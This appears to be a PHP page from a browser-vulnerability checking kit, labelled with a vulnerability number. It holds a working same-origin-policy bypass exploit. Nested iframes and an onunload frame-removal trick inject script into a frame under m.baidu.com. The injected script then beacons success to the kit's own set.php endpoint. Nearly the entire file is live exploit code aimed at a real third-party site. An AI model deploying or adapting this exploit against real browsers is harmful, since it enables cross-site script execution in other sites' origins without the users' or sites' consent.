<?php
    //漏洞编号：143439
    include "../config/config.php";
    $code = htmlspecialchars(strip_tags($_GET['code']),ENT_QUOTES);
?>

<body>
    <script>
        parentFrame = document.body.appendChild(document.createElement("iframe"));
        helperFrame1 = parentFrame.contentDocument.body.appendChild(document.createElement("iframe"));
        helperFrame1.contentWindow.onunload = function() {
            var container = document.createElement("div");
            targetFrame  = container.appendChild(document.createElement("iframe"));
            helperFrame2 = targetFrame.appendChild(document.createElement("iframe"));
            helperFrame2.src = "javascript:top.container.removeChild(top.targetFrame)";
            parentFrame.contentDocument.body.appendChild(container);
        };
        parentFrame.src = "http://m.baidu.com";
        parentFrame.onload = function() {
            parentFrame.onload = null;
            var code = '<?php echo $code; ?>';
            var domain ='<?php echo $DOMAIN; ?>';
            var setPhp = domain + "/php/set.php?code=" + code + "&suc=3" ;
            targetFrame.srcdoc = "<script>if(parent.document.domain == 'm.baidu.com'){new Image().src='" + setPhp + "';}<\/script>" ;
            //targetFrame.srcdoc = "<script>if(parent.document.domain == 'm.baidu.com'){new Image().src='./php/set.php?code=<?php echo $code;?>&suc=3';}<\/script>";
            targetFrame.contentWindow.location = "about:srcdoc";
        }
    </script>
</body>